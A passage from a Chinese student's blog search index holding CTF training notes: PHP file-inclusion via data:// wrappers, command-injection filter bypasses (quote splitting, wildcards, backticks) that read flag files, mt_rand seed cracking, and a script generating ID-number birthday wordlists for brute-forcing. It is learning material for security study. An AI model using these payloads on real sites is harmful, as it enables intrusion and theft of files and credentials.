–&gt;把参数1换成字母就行</p><h5 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h5><p><img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-6/image-20210706201423756.png" alt="image-20210706201423756"></p><p>用了include包含参数c 这意味着代码不会直接执行</p><p>比如``url/?c=_GET[1]&amp;1=flag.php`(不需要分号)无法执行</p><p><em>eval() — 把字符串作为PHP代码执行 <code>return</code> 语句会立即中止当前字符串的执行。</em></p><p><em>php include($file) 和 eval(get_file_contents($file)) 作用相似 </em></p><ul><li><p>url/?c=?page=php://filter/convert.base64-encode/resource=flag.php 不行 包含flag和php</p></li><li><p>url/?c=data://text/plain,<?php phpinfo();?> <img src="/2021/07/13/%E5%AE%9E%E8%AE%AD7-6/image-20210707091656708.png" alt="image-20210707091656708"></p><ul><li><p>data伪协议 将后面语句作为代码执行 –&gt; 验证可行</p></li><li><p>url/?c=data://text/plain,<?php system("tac fla?.php");?></p></li><li><p>或者 url/?c=data://text/plain,<?php system("mv fla?.php 1.txt");?> 然后url/1.txt   <em>//必要时可以base64编码</em></p><p><a href="https://www.cnblogs.com/kuaile1314/p/11897097.html">伪协议与文件包含</a></p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 实训 </category>
          
          <category> 2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实训7.5</title>
      <link href="/2021/07/13/%E5%AE%9E%E8%AE%AD7-5/"/>
      <url>/2021/07/13/%E5%AE%9E%E8%AE%AD7-5/</url>
      
        <content type="html"><![CDATA[<p> <em>2021/7/5</em></p><h3 id="爆破入门"><a href="#爆破入门" class="headerlink" title="爆破入门"></a>爆破入门</h3><p>可爆破 密码 目录</p><h5 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h5><p>mt_rand()</p><p>随机种子爆破 通过运行脚本<a href="https://www.openwall.com/php_mt_seed/%EF%BC%88%E5%9C%A8%E8%BF%99%E4%B8%8B%E8%BD%BD%E7%9A%84%EF%BC%89">https://www.openwall.com/php_mt_seed/（在这下载的）</a></p><p>脚本下载了不会用……</p><p>为什么传参有时候在cookie里有时在url里</p><h5 id="web27"><a href="#web27" class="headerlink" title="web27"></a>web27</h5><p>【题目】爆破生日</p><p>如果用火狐浏览器，burp不能直接抓到这个页面的数据，需要在谷歌浏览器里复制请求头</p><p>爆破方法：</p><ul><li>脚本 </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">//遍历日期</span><br><span class="line">&lt;?php</span><br><span class="line">//621022********5237</span><br><span class="line">    $myfile = fopen(&quot;zid.txt&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);</span><br><span class="line">    for($year=1990;$year&lt;1993;$year++)&#123;</span><br><span class="line">        for($mon=1;$mon&lt;10;$mon++)&#123;</span><br><span class="line">            for($day=01;$day&lt;10;$day++)&#123;</span><br><span class="line">                $txt=(&#x27;621022&#x27;.$year.&#x27;0&#x27;.$mon.&#x27;0&#x27;.$day.&#x27;5237&#x27;).&quot;\n&quot;;</span><br><span class="line">                fwrite($myfile, $txt);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    for($year=1990;$year&lt;1993;$year++)&#123;</span><br><span class="line">        for($mon=1;$mon&lt;10;$mon++)&#123;</span><br><span class="line">            for($day=10;$day&lt;=31;$day++)&#123;</span><br><span class="line">                $txt=(&#x27;621022&#x27;.$year.&quot;0&quot;.$mon.$day.&#x27;5237&#x27;).&quot;\n&quot;;</span><br><span class="line">                fwrite($myfile, $txt);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    for($year=1990;$year&lt;1993;$year++)&#123;</span><br><span class="line">        for($mon=10;$mon&lt;=12;$mon++)&#123;</span><br><span class="line">            for($day=10;$day&lt;=31;$day++)&#123;</span><br><span class="line">                $txt=(&#x27;621022&#x27;.$year.$mon.$day.&#x27;5237&#x27;).&quot;\n&quot;;</span><br><span class="line">                fwrite($myfile, $txt);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    for($year=1990;$year&lt;1993;$year++)&#123;</span><br><span class="line">        for($mon=10;$mon&lt;=12;$mon++)&#123;</span><br><span class="line">            for($day=01;$day&lt;10;$day++)&#123;</span><br><span class="line">                $txt=(&#x27;621022&#x27;.$year.$mon.&quot;0&quot;.$day.&#x27;5237&#x27;).&quot;\n&quot;;</span><br><span class="line">                fwrite($myfile, $txt);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    fclose($myfile);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><ul><li>intruder遍历（payload设置Date)</li></ul><h3 id="命令执行入门"><a href="#命令执行入门" class="headerlink" title="命令执行入门"></a>命令执行入门</h3><p>(代码灰色说明有反向单引号)</p><h5 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h5><p>绕过过滤 flag和i被过滤了</p><ul><li><p>用’’ 过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=echo` nl fl&#x27;&#x27;ag.php;`</span><br></pre></td></tr></table></figure></li><li><p>另起一个变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?c=system($_GET[&#x27;a&#x27;]);&amp;a=nl fla?.php;</span><br><span class="line">//?是占位符 代表一个 类似正则表达</span><br><span class="line">//*也是占位符 代表多个</span><br></pre></td></tr></table></figure></li><li><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url/?c=system(&quot;cp fla?.php 1.txt&quot;) ;</span><br><span class="line">//一定要有;结尾   与?&gt;等价</span><br></pre></td></tr></table></figure><p>然后访问url/1.txt</p></li></ul><h5 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h5><p>绕过过滤 flag system 和 php被过滤了</p><ul><li><p>用’’过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=echo `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;//查看源代码</span><br></pre></td></tr></table></figure></li><li><p>*</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?c=echo `tac *`;</span><br></pre></td></tr></table></figure></li><li><p>/?c=<code>cp fla?.??? 1.txt</code>;然后访问 url/1.txt //反向单引号等同system()</p></li></ul><h6 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h6><blockquote><p>linux 下命令行</p><p>cat  从第一行开始，显示文件的所有内容 </p><p>tac  从第最后一行开始，显示文件的所有内容(正好与cat相反) </p><p>more 根据窗口大小，一页一页的实现文件内容</p><p>less 和more类似，但是优点是是可以往前翻页和搜索字符 </p><p>head  只显示前几行</p><p>tail 只显示后几行 </p><p>nl  类似于cat -n，显示时输出行号</p></blockquote><h6 id="绕过合集"><a href="#绕过合集" class="headerlink" title="绕过合集"></a>绕过合集</h6><p><a href="https://www.cnblogs.com/Mikasa-Ackerman/p/qian-xiphp-ming-ling-zhi-xing.html">https://www.cnblogs.com/Mikasa-Ackerman/p/qian-xiphp-ming-ling-zhi-xing.html</a> 浅析php命令执行</p><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p><a href="https://blog.csdn.net/qq_46150940/article/details/113788511">https://blog.csdn.net/qq_46150940/article/details/113788511</a></p><h5 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h5><ul><li>burpsuite</li><li>firefox hackbar（f12）检查cookie等等</li><li>hackbar（f12）（有点难搞 还不会）</li></ul><h5 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h5><ul><li>base64  √  得到flag</li><li>url</li><li>md5</li><li>unicode</li></ul>]]></content>
      
      
      <categories>
          
          <category> 实训 </category>
          
          <category> 2021 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实训2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>目标</title>
      <link href="/2021/07/12/%E7%9B%AE%E6%A0%87-1/"/>
      <url>/2021/07/12/%E7%9B%AE%E6%A0%87-1/</url>
      
        <content type="html"><![CDATA[<h3 id="GOAL"><a href="#GOAL" class="headerlink" title="GOAL"></a>GOAL</h3><ul><li>web 入门题目 做好笔记</li><li>扇贝 python做下去</li><li>sql教程 <a href="https://www.w3school.com.cn/sql/index.asp">https://www.w3school.com.cn/sql/index.asp</a></li><li>php教程（自己找视频吧毁灭吧）</li><li>基础知识（翻书 实训平台）</li></ul><p>东西好多啊 干一点是一点吧</p><h4 id="需要提高的能力"><a href="#需要提高的能力" class="headerlink" title="需要提高的能力"></a>需要提高的能力</h4><ul><li>脚本能力</li><li>运用工具（老忘记自己工具放哪了别说开始用了 救命 整理一下）</li></ul><hr><p>+++</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hello Hildegarde.</span><br><span class="line">Your goal is </span><br><span class="line">to get off the life&#x27;s hamster wheel</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Hildegarde </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
